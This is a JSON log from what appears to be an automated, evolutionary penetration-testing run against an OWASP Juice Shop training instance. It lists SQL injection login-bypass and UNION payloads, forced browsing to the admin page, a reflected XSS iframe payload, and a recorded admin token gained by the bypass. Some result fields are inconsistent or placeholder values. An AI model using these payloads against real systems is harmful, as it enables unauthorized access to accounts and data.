@@ -1,0 +1,215 @@
+{
+  "run_id": "r1779566730",
+  "target_url": "https://juice-shop-production-d0c5.up.railway.app",
+  "started_at": "2026-05-23T20:05:30Z",
+  "finished_at": "2026-05-23T20:09:27Z",
+  "duration_s": 236.894182607,
+  "generations_run": 2,
+  "total_pods": 6,
+  "outcome": "EXHAUSTED",
+  "best_fitness": 0.1,
+  "breach": null,
+  "per_generation": [
+    {
+      "generation": 1,
+      "population": 3,
+      "survivors": 0,
+      "best_fitness": 0.1,
+      "breaches": 0,
+      "per_pod": [
+        {
+          "Genome": {
+            "vector": "sqli_login",
+            "category": "injection",
+            "technique": "tautology",
+            "target_path": "/rest/user/login",
+            "params": {
+              "email_payload": "' OR 1=1--",
+              "password": "x"
+            },
+            "hint": "Try classic auth bypass via SQL tautology in email field."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "",
+            "pod_id": "",
+            "generation": 0,
+            "vector": "sqli_login",
+            "category": "",
+            "status": "success",
+            "fitness": 0,
+            "evidence": "",
+            "raw_findings": null,
+            "duration_ms": 0,
+            "t": 0
+          },
+          "Fitness": 0,
+          "PodID": "r1779566730-g1-p0"
+        },
+        {
+          "Genome": {
+            "vector": "sqli_login_union",
+            "category": "injection",
+            "technique": "union_select",
+            "target_path": "/rest/user/login",
+            "params": {
+              "email_payload": "' UNION SELECT 1,2,3,4,5--"
+            },
+            "hint": "Try UNION-based info leak."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "r1779566730",
+            "pod_id": "r1779566730-g1-p1",
+            "generation": 1,
+            "vector": "sqli_login_union",
+            "category": "injection",
+            "status": "NOOP",
+            "fitness": 0,
+            "evidence": "pi timed out after 60s",
+            "raw_findings": [],
+            "duration_ms": 64000,
+            "t": 1779566795120
+          },
+          "Fitness": 0,
+          "PodID": "r1779566730-g1-p1"
+        },
+        {
+          "Genome": {
+            "vector": "admin_section",
+            "category": "access_control",
+            "technique": "force_browse",
+            "target_path": "/#/administration",
+            "params": {},
+            "hint": "Try to reach admin UI directly.",
+            "requires_nimble": true
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "oz-run-123",
+            "pod_id": "pod-abc-456",
+            "generation": 1,
+            "vector": "admin_section",
+            "category": "access_control",
+            "status": "NOOP",
+            "fitness": 0,
+            "evidence": "blocked: 403",
+            "raw_findings": [
+              {
+                "method": "GET",
+                "snippet": "403",
+                "status_code": 200,
+                "url": "https://juice-shop-production-d0c5.up.railway.app/#/administration",
+                "used_nimble": true
+              }
+            ],
+            "duration_ms": 1500,
+            "t": 1716456000000
+          },
+          "Fitness": 0.1,
+          "PodID": "r1779566730-g1-p2"
+        }
+      ]
+    },
+    {
+      "generation": 2,
+      "population": 3,
+      "survivors": 0,
+      "best_fitness": 0,
+      "breaches": 0,
+      "per_pod": [
+        {
+          "Genome": {
+            "vector": "sqli_login",
+            "category": "injection",
+            "technique": "tautology",
+            "target_path": "/rest/user/login",
+            "params": {
+              "email_payload": "' OR 1=1--",
+              "password": "x"
+            },
+            "hint": "Try classic auth bypass via SQL tautology in email field."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "",
+            "pod_id": "",
+            "generation": 0,
+            "vector": "sqli_login",
+            "category": "injection",
+            "status": "",
+            "fitness": 0,
+            "evidence": "",
+            "raw_findings": [
+              {
+                "details": "The response contains an authentication token and identifies the user as admin@juice-sh.op, indicating a successful SQL injection auth bypass.",
+                "evidence": "Received JWT token upon providing '\" OR 1=1 --' in the email field."
+              }
+            ],
+            "duration_ms": 0,
+            "t": 0
+          },
+          "Fitness": 0,
+          "PodID": "r1779566730-g2-p0"
+        },
+        {
+          "Genome": {
+            "vector": "sqli_login_union",
+            "category": "injection",
+            "technique": "union_select",
+            "target_path": "/rest/user/login",
+            "params": {
+              "email_payload": "' UNION SELECT 1,2,3,4,5--"
+            },
+            "hint": "Try UNION-based info leak."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "r1779566730",
+            "pod_id": "r1779566730-g2-p1",
+            "generation": 2,
+            "vector": "sqli_login_union",
+            "category": "injection",
+            "status": "NOOP",
+            "fitness": 0,
+            "evidence": "pi timed out after 60s",
+            "raw_findings": [],
+            "duration_ms": 62000,
+            "t": 1779566893974
+          },
+          "Fitness": 0,
+          "PodID": "r1779566730-g2-p1"
+        },
+        {
+          "Genome": {
+            "vector": "xss_search_reflected",
+            "category": "xss",
+            "technique": "reflected",
+            "target_path": "/#/search",
+            "params": {
+              "q": "\u003ciframe src=javascript:alert(1)\u003e"
+            },
+            "hint": "Try reflected XSS via search query parameter."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "r1779566730",
+            "pod_id": "r1779566730-g2-p2",
+            "generation": 2,
+            "vector": "xss_search_reflected",
+            "category": "xss",
+            "status": "NOOP",
+            "fitness": 0,
+            "evidence": "pi timed out after 60s",
+            "raw_findings": [],
+            "duration_ms": 62000,
+            "t": 1779566892822
+          },
+          "Fitness": 0,
+          "PodID": "r1779566730-g2-p2"
+        }
+      ]
+    }
+  ],
+  "narrative_md_path": "out/summary-r1779566730.md"
+}
